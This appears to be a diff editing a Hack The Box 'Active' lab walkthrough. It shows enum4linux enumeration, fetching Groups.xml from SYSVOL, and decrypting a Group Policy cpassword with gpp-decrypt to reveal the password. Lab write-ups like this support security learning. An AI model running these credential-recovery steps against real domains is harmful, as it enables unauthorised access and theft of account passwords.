@@ -36,7 +36,7 @@ Notice (Domain: active.htb) add active.htb to /etc/hosts file
 
 Step 2 
 
-Enum4linux 10.10.10.100
+enum4linux 10.10.10.100
 
 I found 
 
@@ -62,7 +62,7 @@ I found file called Groups.xml in "active.htb\Policies\{31B2F340-016D-11D2-945F-
 
 Download this file in attacker machine
 
-Get Groups.xml
+> get Groups.xml
 
 I found in file
 
@@ -71,7 +71,7 @@ cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8
 
 Decrypt cpassword
 
-Gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
 
 Password is : GPPstillStandingStrong2k18
 
